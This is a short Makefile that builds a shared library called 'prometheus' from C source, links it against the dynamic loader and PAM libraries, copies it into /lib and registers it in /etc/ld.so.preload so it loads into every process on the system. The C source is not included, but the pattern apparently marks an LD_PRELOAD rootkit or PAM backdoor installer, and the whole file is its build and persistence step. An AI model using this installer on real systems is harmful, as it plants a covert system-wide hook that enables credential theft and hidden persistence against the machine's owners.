INSTALL=/lib
CFLAGS+= -Wall
LDFLAGS+= -ldl -lpam

all: prometheus

prometheus: prometheus.c
	$(CC) -fPIC -g -c prometheus.c
	$(CC) -fPIC -shared prometheus.o $(LDFLAGS) -o prometheus.so

install: all
	@echo [+] Installing Prometheus to $(INSTALL)
	@test -d $(INSTALL) || mkdir $(INSTALL)
	@install -m 0755 prometheus.so $(INSTALL)/
	@echo $(INSTALL)/prometheus.so > /etc/ld.so.preload

clean:
	rm -f *.o *.so
